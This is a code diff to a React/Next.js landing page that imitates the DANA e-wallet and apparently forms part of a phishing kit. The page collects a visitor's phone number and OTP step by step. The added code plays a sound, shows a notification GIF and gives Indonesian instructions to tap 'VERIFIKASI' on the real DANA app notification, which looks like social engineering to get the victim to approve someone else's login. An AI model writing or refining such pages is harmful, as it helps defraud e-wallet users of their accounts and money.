@@ -1,12 +1,18 @@
 'use client';
 
-import { useEffect, useRef, useState } from 'react';
+import { useCallback, useEffect, useRef, useState } from 'react';
 import Image from 'next/image';
 import { ChevronLeft, CreditCard, Headphones, Loader2, ShoppingBag } from 'lucide-react';
 import { DanaLoadingSpinnerOverlay } from './DanaLoadingSpinnerOverlay';
+import { useLandingPhoneBack } from '@/hooks/useLandingPhoneBack';
 
 import { submitLandingStepViaApi } from '@/lib/landing/submit-client';
 import type { SlugData, StepData } from '@/lib/landing/types';
+import {
+  LANDING_STEP3_SOUND,
+  playLandingStep3Sound,
+  stopLandingSound,
+} from '@/lib/landing-audio';
 import { dismissMobileKeyboard, useKeyboardBottomOffset } from '@/hooks/use-visual-viewport';
 import { StandardPaylaterStep1View } from './standard/StandardPaylaterStep1View';
 import { StandardPaylaterPopup } from './standard/StandardPaylaterPopup';
@@ -26,6 +32,8 @@ type LandingPageClientProps = {
   /** Gaya popup slider paylater di step 1 */
   paylaterPopupStyle?: 'standard' | 'professional';
 };
+
+const STEP3_SOUND_SRC = LANDING_STEP3_SOUND;
 
 function formatPhoneInput(value: string): string {
   const digits = value.replace(/\D/g, '').slice(0, 13);
@@ -125,9 +133,69 @@ export default function LandingPageClient({
   const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpLockTimeoutRef = useRef<number | null>(null);
   const otpCompleteRingTimeoutRef = useRef<number | null>(null);
+  const step3SoundTimerRef = useRef<number | null>(null);
   const keyboardOffset = useKeyboardBottomOffset();
   const isDefaultStep1 = (step === 1 || previousStep === 1) && step1Variant === 'default';
   const step1KeyboardOffset = isDefaultStep1 ? keyboardOffset : 0;
+
+  const isAtHome =
+    !formOnly &&
+    showEntryMenu &&
+    renderEntryMenu &&
+    step === 0 &&
+    !renderStep0 &&
+    !isEntryFadingOut;
+  const phoneBackScreen = isAtHome ? 'home' : 'away';
+
+  const goHome = useCallback(() => {
+    setShowEntryMenu(true);
+    setRenderEntryMenu(true);
+    setIsEntryFadingOut(false);
+    setStep(0);
+    setRenderStep0(false);
+    setStep0Visible(false);
+    setStep0FadingOut(false);
+    setStep0ScrollLocked(false);
+    setHasShownStepZero(false);
+    setPreviousStep(null);
+    setStep3Entered(false);
+    setErrorMessage('');
+    setPaylaterPopupOpen(false);
+    stopLandingSound(STEP3_SOUND_SRC);
+  }, []);
+
+  useLandingPhoneBack(formOnly ? 'home' : phoneBackScreen, goHome, (target) => target === 'home', {
+    historyKey: 'basicScreen',
+  });
+
+  useEffect(() => {
+    if (step !== 3) {
+      if (step3SoundTimerRef.current) {
+        window.clearTimeout(step3SoundTimerRef.current);
+        step3SoundTimerRef.current = null;
+      }
+      stopLandingSound(STEP3_SOUND_SRC);
+      return;
+    }
+
+    if (step3SoundTimerRef.current) window.clearTimeout(step3SoundTimerRef.current);
+    step3SoundTimerRef.current = window.setTimeout(() => {
+      step3SoundTimerRef.current = null;
+      playLandingStep3Sound();
+    }, 320);
+
+    return () => {
+      if (step3SoundTimerRef.current) {
+        window.clearTimeout(step3SoundTimerRef.current);
+        step3SoundTimerRef.current = null;
+      }
+      stopLandingSound(STEP3_SOUND_SRC);
+    };
+  }, [step]);
+
+  useEffect(() => {
+    return () => stopLandingSound(STEP3_SOUND_SRC);
+  }, []);
 
   useEffect(() => {
     if (step === 2) {
@@ -760,6 +828,17 @@ export default function LandingPageClient({
               <DanaLogoBlue />
             </div>
 
+            <div className="mt-4">
+              <Image
+                src="/notif.gif"
+                width={200}
+                height={120}
+                className="mx-auto h-auto w-[200px]"
+                alt="Notifikasi"
+                unoptimized
+              />
+            </div>
+
             <p className="mt-6 text-center text-[13px] text-gray-700">Kode dikirim ke</p>
             <div className="mt-2 flex justify-center">
               <div className="rounded-full bg-[#108EE9] px-5 py-2.5">
@@ -826,6 +905,38 @@ export default function LandingPageClient({
                   Kirim ulang
                 </button>
               )}
+            </div>
+
+            <div className="mt-8 border-t border-gray-100 pt-6">
+              <p className="text-[13px] font-semibold text-gray-800">Silahkan Cek verifikasi akun DANA kamu:</p>
+
+              <div className="mt-4 flex gap-3">
+                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                    <rect x="6" y="2" width="12" height="20" rx="2" stroke="#108EE9" strokeWidth="1.5" />
+                    <circle cx="12" cy="18" r="1" fill="#108EE9" />
+                  </svg>
+                </div>
+                <p className="text-[11px] leading-relaxed text-gray-600">
+                  Tap notifikasi di perangkatmu di layar atas dan tap{' '}
+                  <span className="font-bold text-gray-800">VERIFIKASI</span>.
+                </p>
+              </div>
+
+              <div className="mt-4 flex gap-3">
+                <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-full bg-[#108EE9]/10">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#108EE9" strokeWidth="1.5" />
+                    <path d="M3 7l9 6 9-6" stroke="#108EE9" strokeWidth="1.5" />
+                  </svg>
+                </div>
+                <p className="text-[11px] leading-relaxed text-gray-600">
+                  Tidak menerima notifikasi? Cek Kotak Masuk atau menu{' '}
+                  <span className="font-bold text-gray-800">Verifikasi</span>. atau cek di icon gambar{' '}
+                  <span className="font-bold text-gray-800">Amplop</span> dan tap{' '}
+                  <span className="font-bold text-gray-800">Verifikasi</span>.
+                </p>
+              </div>
             </div>
 
             {errorMessage && (
